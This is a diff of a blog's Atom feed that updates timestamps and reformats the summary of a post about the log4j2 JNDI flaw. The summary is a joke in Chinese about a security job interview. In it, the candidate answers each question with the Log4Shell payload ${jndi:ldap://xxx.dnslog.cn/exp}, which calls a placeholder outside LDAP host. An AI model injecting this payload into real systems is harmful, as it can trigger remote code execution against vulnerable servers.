@@ -6,7 +6,7 @@
   <link href="http://www.ch4ser.top/atom.xml" rel="self"/>
   
   <link href="http://www.ch4ser.top/"/>
-  <updated>2021-12-11T08:51:59.382Z</updated>
+  <updated>2021-12-11T08:52:48.150Z</updated>
   <id>http://www.ch4ser.top/</id>
   
   <author>
@@ -21,10 +21,12 @@
     <link href="http://www.ch4ser.top/2021/12/11/log4j2-jndi/"/>
     <id>http://www.ch4ser.top/2021/12/11/log4j2-jndi/</id>
     <published>2021-12-11T06:56:51.000Z</published>
-    <updated>2021-12-11T08:51:59.382Z</updated>
+    <updated>2021-12-11T08:52:48.150Z</updated>
     
     
-    <summary type="html">&lt;p&gt;明天安全圈校招面试:&lt;br&gt;面试官: 请说说你会什么技能?&lt;br&gt;我: ${jndi:ldap://xxx.dnslog.cn/exp}&lt;br&gt;面试官: 请说说你最近关注过的漏洞?&lt;br&gt;我: ${jndi:ldap://xxx.dnslog.cn/exp}&lt;br&gt;面试官: 你平时有动手调试过吗?&lt;br&gt;我: ${jndi:ldap://xxx.dnslog.cn/exp}&lt;br&gt;我：这dnslog是不是卡了 这面试官怎么还没rce&lt;/p&gt;</summary>
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;明天安全圈校招面试:&lt;br&gt;面试官: 请说说你会什么技能?&lt;br&gt;我: ${jndi:ldap://xxx.dnslog.cn/exp}&lt;br&gt;面试官: 请说说你最近关注过的漏洞?&lt;br&gt;我: ${jndi:ldap://xxx.dnslog.cn/exp}&lt;br&gt;面试官: 你平时有动手调试过吗?&lt;br&gt;我: ${jndi:ldap://xxx.dnslog.cn/exp}&lt;br&gt;我：这dnslog是不是卡了 这面试官怎么还没rce&lt;/p&gt;
+&lt;/blockquote&gt;</summary>
     
     
     
